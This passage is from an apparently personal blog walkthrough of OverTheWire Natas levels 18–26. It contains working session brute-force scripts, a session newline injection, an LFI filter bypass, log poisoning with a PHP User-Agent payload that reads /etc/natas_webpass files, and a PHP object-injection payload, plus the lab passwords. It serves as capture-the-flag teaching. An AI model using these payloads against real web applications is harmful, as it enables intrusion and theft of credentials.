<li><p>debug($msg) this just prints messages such as session started, etc.</p></li>
<li><p>my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn&rsquo;t exist in the $_SESSION array</p></li>
<li><p>print_credentials() prints the password we&rsquo;re after if there is an admin session ID that&rsquo;s set to 1 in the $_SESSION array. Otherwise it just prints a regular message</p></li>
</ul>


<p>Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:</p>

<p>``` python
import requests</p>

<p>success = &lsquo;You are an admin&rsquo;
session_id = 0
while session_id &lt; 640:</p>

<pre><code>cookie = {'PHPSESSID': str(session_id)}
print 'Trying with session ID: ' + str(session_id)
guess = requests.get('http://natas18.natas.labs.overthewire.org/', \
                      auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), \
                      cookies=cookie)
if success in guess.text:
    print guess.text
    print 'Admin session ID was: ' + str(session_id)
    break
session_id += 1
</code></pre>

<p>```</p>

<p>I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code></p>

<h3>Level 19</h3>

<p><img class="center" src="/images/overthewire/natas/natas19.png" title="&lsquo;natas19&rsquo; &lsquo;natas 19&rsquo;" ></p>

<p>We don&rsquo;t have source code this time and apparently the session IDs aren&rsquo;t sequential anymore..Let&rsquo;s see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. <em>admin</em> was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code><em>random number-username</em></code>. So again, brute forcing to the rescue! Since I didn&rsquo;t know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:</p>

<p>``` python
import requests</p>

<p>success = &lsquo;You are an admin&rsquo;
session_id = 0
while session_id &lt; 640:</p>

<pre><code>pattern = str(session_id) + '-admin'
cookie = {'PHPSESSID': pattern.encode('hex')}
print 'Trying with session ID: ' + pattern
guess = requests.get('http://natas19.natas.labs.overthewire.org/', \
                      auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), \
                      cookies=cookie)
if success in guess.text:
    print guess.text
    print 'Admin session ID was: ' + pattern
    print cookie
    break
session_id += 1
</code></pre>

<p>```</p>

<p>And after a while I hit the jackpot with a sessiod ID of <em>381-admin</em>. The password for the next level is <code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code></p>

<h3>Level 20</h3>

<p><img class="center" src="/images/overthewire/natas/natas20.png" title="&lsquo;natas20&rsquo; &lsquo;natas 20&rsquo;" ></p>

<p>Code:</p>

<p>``` php
&lt;?</p>

<p>function debug($msg) {</p>

<pre><code>if(array_key_exists("debug", $_GET)) {
    print "DEBUG: $msg&lt;br&gt;";
}
</code></pre>

<p>}</p>

<p>function print_credentials() {</p>

<pre><code>if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas21\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
}
</code></pre>

<p>}</p>

<p>/<em> we don&rsquo;t need this </em>/
function myopen($path, $name) {</p>

<pre><code>//debug("MYOPEN $path $name"); 
return true; 
</code></pre>

<p>}</p>

<p>/<em> we don&rsquo;t need this </em>/
function myclose() {</p>

<pre><code>//debug("MYCLOSE"); 
return true; 
</code></pre>

<p>}</p>

<p>function myread($sid) {</p>

<pre><code>debug("MYREAD $sid"); 
if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
debug("Invalid SID"); 
    return "";
}
$filename = session_save_path() . "/" . "mysess_" . $sid;
if(!file_exists($filename)) {
    debug("Session file doesn't exist");
    return "";
}
debug("Reading from ". $filename);
$data = file_get_contents($filename);
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
$parts = explode(" ", $line, 2);
if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
return session_encode();
</code></pre>

<p>}</p>

<p>function mywrite($sid, $data) {</p>

<pre><code>// $data contains the serialized version of $_SESSION
// but our encoding is better
debug("MYWRITE $sid $data"); 
// make sure the sid is alnum only!!
if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
debug("Invalid SID"); 
    return;
}
$filename = session_save_path() . "/" . "mysess_" . $sid;
$data = "";
debug("Saving in ". $filename);
ksort($_SESSION);
foreach($_SESSION as $key =&gt; $value) {
    debug("$key =&gt; $value");
    $data .= "$key $value\n";
}
file_put_contents($filename, $data);
chmod($filename, 0600);
</code></pre>

<p>}</p>

<p>/<em> we don&rsquo;t need this </em>/
function mydestroy($sid) {</p>

<pre><code>//debug("MYDESTROY $sid"); 
return true; 
</code></pre>

<p>}
/<em> we don&rsquo;t need this </em>/
function mygarbage($t) {</p>

<pre><code>//debug("MYGARBAGE $t"); 
return true; 
</code></pre>

<p>}</p>

<p>session_set_save_handler(</p>

<pre><code>"myopen", 
"myclose", 
"myread", 
"mywrite", 
"mydestroy", 
"mygarbage");
</code></pre>

<p>session_start();</p>

<p>if(array_key_exists(&ldquo;name&rdquo;, $_REQUEST)) {</p>

<pre><code>$_SESSION["name"] = $_REQUEST["name"];
debug("Name set to " . $_REQUEST["name"]);
</code></pre>

<p>}</p>

<p>print_credentials();</p>

<p>$name = &ldquo;&rdquo;;
if(array_key_exists(&ldquo;name&rdquo;, $_SESSION)) {</p>

<pre><code>$name = $_SESSION["name"];
</code></pre>

<p>}</p>

<p>?>
```</p>

<p>This is similar to the previous challenges, we still need the $_SESSION array to contain a key named <em>admin</em> with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let&rsquo;s look at the debug output when we change our name: <a href="http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug">http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug</a></p>

<p>``` plain
DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1 // debug(&ldquo;MYREAD $sid&rdquo;);
DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug(&ldquo;Reading from &rdquo;. $filename);
DEBUG: Read [name admin] // debug(&ldquo;Read [$line]&rdquo;);
DEBUG: Read [] // debug(&ldquo;Read [$line]&rdquo;);
DEBUG: Name set to admin // debug(&ldquo;Name set to &rdquo; . $_REQUEST[&ldquo;name&rdquo;]);</p>

<p>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:5:&ldquo;admin&rdquo;; // debug(&ldquo;MYWRITE $sid $data&rdquo;);
DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug(&ldquo;Saving in &rdquo;. $filename);
DEBUG: name => admin // debug(&ldquo;$key => $value&rdquo;);
```</p>

<p>I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:</p>

<ul>
<li><p><strong>function mywrite($sid, $data)</strong> &ndash; after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like <em>mysess_SID</em>, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that <em>name</em> is the key and <em>admin</em> is the value. Then the key and value are written to the file as follows: <code>$data .= &ldquo;$key $value\n&rdquo;;</code>. So the data will look like this: <em>name admin</em> followed by a newline.</p></li>
<li><p><strong>function myread($sid)</strong> &ndash; this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file</p></li>
</ul>


<p>We want to focus on the <em>mywrite</em> function because that&rsquo;s the actual code that writes the data that we passed to the server. And the code that needs our attention is this:</p>

<p>``` php
foreach($_SESSION as $key => $value) {</p>

<pre><code>    debug("$key =&gt; $value");
    $data .= "$key $value\n"; 
</code></pre>

<p>```</p>

<p>We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of <em>admin => 1</em>. And the <em>mywrite</em> function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter&hellip;what if we can inject another key / value pair after our initial input? We currently have this: <em>name => admin</em> by entering <em>admin</em> in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:</p>

<p><code>plain
name admin
admin 1
</code></p>

<p>Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&amp;name=admin%0Aadmin%201 and here&rsquo;s the output:</p>

<p>``` plain
DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: Read [name admin]
DEBUG: Read [admin 1]
DEBUG: Read []
DEBUG: Name set to admin admin 1
You are an admin. The credentials for the next level are:</p>

<p>Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</p>

<p>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:13:&ldquo;admin admin 1&rdquo;;admin|s:1:&ldquo;1&rdquo;;
DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: admin => 1
DEBUG: name => admin admin 1
```</p>

<p>And we successfully acquired the next password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code></p>

<h3>Level 21</h3>

<p><img class="center" src="/images/overthewire/natas/natas21.png" title="&lsquo;natas21&rsquo; &lsquo;natas 21&rsquo;" ></p>

<p>We need to satisfy the same requirements as before to get next password:</p>

<p>``` php
&lt;?</p>

<p>function print_credentials() {</p>

<pre><code>if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas22\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
}
</code></pre>

<p>}</p>

<p>session_start();
print_credentials();</p>

<p>?>
```</p>

<p><img class="center" src="/images/overthewire/natas/natas21css.png" title="&lsquo;natas21css&rsquo; &lsquo;natas 21css&rsquo;" ></p>

<p>This page allows you to play with some CSS values. Also the session ID for this page is different than the other one.</p>

<p>``` php
&lt;?</p>

<p>session_start();</p>

<p>// if update was submitted, store it
if(array_key_exists(&ldquo;submit&rdquo;, $_REQUEST)) {</p>

<pre><code>foreach($_REQUEST as $key =&gt; $val) {
$_SESSION[$key] = $val;
}
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;debug&rdquo;, $_GET)) {</p>

<pre><code>print "[DEBUG] Session contents:&lt;br&gt;";
print_r($_SESSION);
</code></pre>

<p>}</p>

<p>// only allow these keys
$validkeys = array(&ldquo;align&rdquo; => &ldquo;center&rdquo;, &ldquo;fontsize&rdquo; => &ldquo;100%&rdquo;, &ldquo;bgcolor&rdquo; => &ldquo;yellow&rdquo;);
$form = &ldquo;&rdquo;;</p>

<p>$form .= &lsquo;<form action="index.php" method="POST">&rsquo;;
foreach($validkeys as $key => $defval) {</p>

<pre><code>$val = $defval;
if(array_key_exists($key, $_SESSION)) {
$val = $_SESSION[$key];
} else {
$_SESSION[$key] = $val;
}
$form .= "$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;";
</code></pre>

<p>}
$form .= &lsquo;<input type="submit" name="submit" value="Update" />&rsquo;;
$form .= &lsquo;</form>&rsquo;;</p>

<p>$style = &ldquo;background-color: &rdquo;.$<em>SESSION[&ldquo;bgcolor&rdquo;].&ldquo;; text-align: &rdquo;.$</em>SESSION[&ldquo;align&rdquo;].&ldquo;; font-size: &rdquo;.$_SESSION[&ldquo;fontsize&rdquo;].&ldquo;;&rdquo;;
$example = &ldquo;<div style='$style'>Hello world!</div>&rdquo;;</p>

<p>?>
```</p>

<p>If you turn on debug, you can see the contents of the $_SESSION array:</p>

<p><code>plain
[DEBUG] Session contents:
Array ( [align] =&gt; center [fontsize] =&gt; 100% [bgcolor] =&gt; blue [submit] =&gt; Update )
</code></p>

<p>Again we want to insert the pair <em>admin => 1</em> in the array, but the code only allows those 3 keys, so we can&rsquo;t POST what we want. But if we look at this code:</p>

<p>``` php
// if update was submitted, store it
if(array_key_exists(&ldquo;submit&rdquo;, $_REQUEST)) {</p>

<pre><code>foreach($_REQUEST as $key =&gt; $val) {
$_SESSION[$key] = $val;
}
</code></pre>

<p>}
```</p>

<p>As long as the key <em>submit</em> exists in the $<em>REQUEST array, it will take the key / value pairs in the $</em>REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can&rsquo;t POST our values because of the validity checks. Reading through the PHP manual I saw this:</p>

<blockquote><p>$<em>REQUEST — An associative array that by default contains the contents of $</em>GET, $<em>POST and $</em>COOKIE.</p>

<p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
user and cannot be trusted.</p></blockquote>

<p>Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key <em>submit</em> exists. Instead of POST'ing, I modified the HTML using Firebug to:</p>

<p><code>html
bgcolor:
&lt;input value="1" name="admin"&gt;
</code></p>

<p>On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:</p>

<p>``` plain
You are an admin. The credentials for the next level are:</p>

<p>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```</p>

<h3>Level 22</h3>

<p><img class="center" src="/images/overthewire/natas/natas22.png" title="&lsquo;natas22&rsquo; &lsquo;natas 22&rsquo;" ></p>

<p>Pretty blank, eh? Let&rsquo;s look at the code:</p>

<p>``` php</p>

<p>&lt;?
session_start();</p>

<p>if(array_key_exists(&ldquo;revelio&rdquo;, $_GET)) {</p>

<pre><code>// only admins can reveal the password
if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
header("Location: /");
}
</code></pre>

<p>}
?></p>

<p>&lt;?</p>

<pre><code>if(array_key_exists("revelio", $_GET)) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas23\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
}
</code></pre>

<p>?>
```</p>

<p>Well, it looks like all you have to do is pass a GET parameter named <em>revelio</em> and receive the password. But if you&rsquo;re not an admin, you will just be redirected to the same page via a Location header. I couldn&rsquo;t think of a way to fool the page that I&rsquo;m admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:</p>

<p><code>plain
You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE&lt;/pre&gt;
</code></p>

<p>After receiving this response the browser made another request..but at this point it didn&rsquo;t matter :D</p>

<h3>Level 23</h3>

<p><img class="center" src="/images/overthewire/natas/natas23.png" title="&lsquo;natas23&rsquo; &lsquo;natas 23&rsquo;" ></p>

<p>Here we have to input a password to login. Let&rsquo;s see the code:</p>

<p>``` plain
&lt;?php</p>

<pre><code>if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") &amp;&amp; ($_REQUEST["passwd"] &gt; 10 )){
        echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
        echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
    }
    else{
        echo "&lt;br&gt;Wrong!&lt;br&gt;";
    }
}
// morla / 10111
</code></pre>

<p>?><br/>
```</p>

<p>We will get the credentials if we enter a password that contains the string <em>iloveyou</em> and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the <a href="https://secure.php.net/manual/en/language.operators.comparison.php">Comparison Operators</a> section:</p>

<blockquote><p>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison
performed numerically.</p></blockquote>

<p><a href="https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion">So how is the string converted to a number?</a></p>

<blockquote><p>If the string does not contain any of the characters &lsquo;.&rsquo;, &lsquo;e&rsquo;, or &lsquo;E&rsquo; and the numeric value fits into integer type limits (as defined by
PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.</p>

<p>The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
value will be 0 (zero).</p></blockquote>

<p>So all we have to do is enter a password that starts with a number greater than 50, followed by the <em>iloveyou</em> string, something like <em>50iloveyou</em>:</p>

<p>``` plain
The credentials for the next level are:</p>

<p>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```</p>

<p>// (I thought at the beginning that the comment was related to the challenge, but it turns out that&rsquo;s the handle of the creator of the challenge).</p>

<h3>Level 24</h3>

<p><img class="center" src="/images/overthewire/natas/natas23.png" title="&lsquo;natas24&rsquo; &lsquo;natas 24&rsquo;" ></p>

<p>``` php
&lt;?php</p>

<pre><code>if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"&lt;censored&gt;")){
        echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
        echo "&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;";
    }
    else{
        echo "&lt;br&gt;Wrong!&lt;br&gt;";
    }
}
// morla / 10111
</code></pre>

<p>?><br/>
```</p>

<p>This level is centered around exploiting the <em>strcmp</em> function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:</p>

<p><code>plain
int strcmp ( string $str1 , string $str2 )
Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal.
</code></p>

<p>When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check <a href="http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Chaotic Security blog</a> and the <a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">OWASP PHP security cheatsheet</a>. If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: <a href="http://natas24.natas.labs.overthewire.org/?passwd">http://natas24.natas.labs.overthewire.org/?passwd</a>[]=pwn</p>

<p>``` plain
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23</p>

<p>The credentials for the next level are:</p>

<p>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```</p>

<h3>Level 25</h3>

<p><img class="center" src="/images/overthewire/natas/natas25.png" title="&lsquo;natas25&rsquo; &lsquo;natas 25&rsquo;" ></p>

<p>Here we have a page with a quote that we can choose to view in English or German.</p>

<p>``` php
&lt;?php</p>

<pre><code>// cheers and &lt;3 to malvina
// - morla

function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en"); 
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}

function listFiles($path){
    $listoffiles=array();
    if ($handle = opendir($path))
        while (false !== ($file = readdir($handle)))
            if ($file != "." &amp;&amp; $file != "..")
                $listoffiles[]=$file;

    closedir($handle);
    return $listoffiles;
} 

function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
</code></pre>

<p>?>
```</p>

<p>At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=&hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code></p>

<p>``` plain
[17.10.2015 14::02:27] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 &ldquo;Directory traversal attempt! fixing request.&rdquo; [17.10.2015 14::02:38] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 &ldquo;Directory traversal attempt! fixing request.&rdquo;
Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80</p>

<p>Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81</p>

<p>Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82
```</p>

<p>Excellent, now we&rsquo;re getting somewhere! The next technique we&rsquo;ll use to get the password is a log poisoning attack. Read more <a href="http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/">here</a></p>

<p>If you look at the <em>logRequest</em> function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let&rsquo;s see this in practice:</p>

<ul>
<li><p>I changed my user agent to <code>&lt;?php readfile(&lsquo;/etc/natas_webpass/natas26&rsquo;); ?></code></p></li>
<li><p>Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:</p></li>
</ul>


<p><code>plain
"Directory traversal attempt! fixing request." [17.10.2015 15::56:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
</code></p>

<p>The password is <code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code></p>

<h3>Level 26</h3>

<p><img class="center" src="/images/overthewire/natas/natas26.png" title="&lsquo;natas26&rsquo; &lsquo;natas 26&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php</p>

<pre><code>// sry, this is ugly as hell.
// cheers kaliman ;)
// - morla

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this-&gt;initMsg="#--session started--#\n";
        $this-&gt;exitMsg="#--session end--#\n";
        $this-&gt;logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       

    function log($msg){
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       

    function __destruct(){
        // write exit message
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$this-&gt;exitMsg);
        fclose($fd);
    }                       
}

function showImage($filename){
    if(file_exists($filename))
        echo "&lt;img src=\"$filename\"&gt;";
}

function drawImage($filename){
    $img=imagecreatetruecolor(400,300);
    drawFromUserdata($img);
    imagepng($img,$filename);     
    imagedestroy($img);
}

function drawFromUserdata($img){
    if( array_key_exists("x1", $_GET) &amp;&amp; array_key_exists("y1", $_GET) &amp;&amp;
        array_key_exists("x2", $_GET) &amp;&amp; array_key_exists("y2", $_GET)){

        $color=imagecolorallocate($img,0xff,0x12,0x1c);
        imageline($img,$_GET["x1"], $_GET["y1"], 
                        $_GET["x2"], $_GET["y2"], $color);
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        if($drawing)
            foreach($drawing as $object)
                if( array_key_exists("x1", $object) &amp;&amp; 
                    array_key_exists("y1", $object) &amp;&amp;
                    array_key_exists("x2", $object) &amp;&amp; 
                    array_key_exists("y2", $object)){

                    $color=imagecolorallocate($img,0xff,0x12,0x1c);
                    imageline($img,$object["x1"],$object["y1"],
                            $object["x2"] ,$object["y2"] ,$color);

                }
    }    
}

function storeData(){
    $new_object=array();

    if(array_key_exists("x1", $_GET) &amp;&amp; array_key_exists("y1", $_GET) &amp;&amp;
        array_key_exists("x2", $_GET) &amp;&amp; array_key_exists("y2", $_GET)){
        $new_object["x1"]=$_GET["x1"];
        $new_object["y1"]=$_GET["y1"];
        $new_object["x2"]=$_GET["x2"];
        $new_object["y2"]=$_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    else{
        // create new array
        $drawing=array();
    }

    $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing)));
}
</code></pre>

<p>?></p>

<p>&lt;?php</p>

<pre><code>session_start();

if (array_key_exists("drawing", $_COOKIE) ||
    (   array_key_exists("x1", $_GET) &amp;&amp; array_key_exists("y1", $_GET) &amp;&amp;
        array_key_exists("x2", $_GET) &amp;&amp; array_key_exists("y2", $_GET))){  
    $imgfile="img/natas26_" . session_id() .".png"; 
    drawImage($imgfile); 
    showImage($imgfile);
    storeData();
}
</code></pre>

<p>?></p>

<p>```</p>

<p>Code looks complicated so I&rsquo;m breaking it down in little pieces:</p>

<ul>
<li><p>We have a Logger class that writes some messages to a log file</p></li>
<li><p>the <em>showImage()</em> function sets the image tag source to the given filename, if that file exists</p></li>
<li><p>the <em>drawImage()</em> function creates an image and outputs it to the browser</p></li>
<li><p><em>drawFromUserdata()</em> uses the user-supplied coordinates to draw lines across the image</p></li>
<li><p><em>storeData()</em> populates an array with the 4 $_GET parameters and sets a cookie named <em>drawing</em> to contain the serialized and base64 encoded value of the previously created array</p></li>
</ul>


<p>So far, out of ideas, but when reading about <em>unserialize()</em> in the PHP manual, there was a security warning:</p>

<blockquote><p>Warning</p>

<p>Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and
autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and
json_encode()) if you need to pass serialized data to the user.</p></blockquote>

<p>Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn&rsquo;t instantiated anywhere in the program. But first, we must understand what serialization is all about.</p>

<ul>
<li><p><em>string serialize ( mixed $value )</em></p></li>
<li><p>Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere.</p></li>
</ul>


<p><strong>Serialization</strong> is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc.</p>

<p><strong>Unserialization</strong> converts the string back to a PHP value</p>

<p>Now let&rsquo;s look at what OWASP says about the PHP object injection attack:</p>

<blockquote><p>The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP
allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP
object(s) injection into the application scope.</p>

<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>

<p>The application must have a class which implements a PHP magic method (such as <strong>wakeup or </strong>destruct) that can be used to carry out malicious
attacks, or to start a &ldquo;POP chain&rdquo;.</p>

<p>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
supported for such classes.</p></blockquote>

<p>Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a <em>__construct()</em> and <em>__destruct()</em> magic method. So the class wasn&rsquo;t just lying around for nothing in the code, hehehe!</p>

<p>Before continuing, I want to show an <a href="http://www.w3resource.com/php/function-reference/serialize.php">example of serialization</a>, so you can have an idea of what it looks like with an easier to understand example than deciphering the <em>drawing</em> cookie:</p>

<p>``` php</p>

<pre><code>&lt;?php  
$serialized_data = serialize(array('Math', 'Language', 'Science'));  
echo  $serialized_data . '&lt;br&gt;';  
?&gt;  
</code></pre>

<p>```</p>

<p>And the output is <code>a:3:{i:0;s:4:&ldquo;Math&rdquo;;i:1;s:8:&ldquo;Language&rdquo;;i:2;s:7:&ldquo;Science&rdquo;;}</code>. Ugh, looks complicated! But here it is:</p>

<ul>
<li><p>a = array, 3 = the number of elements in the array</p></li>
<li><p>i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well</p></li>
</ul>


<p>Now, to exploit this. We have:</p>

<ul>
<li><p>a way to inject our own code into the application (by changing the <em>drawing</em> cookie that will get unserialized)</p></li>
<li><p>a way to write to a file (leverage the Logger class)</p></li>
<li><p>a way to read a file (we can browse to where images are stored inside <em>img/</em>)</p></li>
</ul>


<p>First, I made my own malicious Logger class:</p>

<p>``` php
&lt;?php
class Logger{</p>

<pre><code>    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this-&gt;initMsg="pwn";
        $this-&gt;exitMsg= "&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";
        $this-&gt;logFile = "img/pass.php";
    }                                            

    function __destruct(){
        // write exit message
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$this-&gt;exitMsg);
        fclose($fd);
    }                       
}
</code></pre>

<p>$myobj = new Logger();
echo base64_encode(serialize($myobj));
?>
```</p>

<p>This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:</p>

<ul>
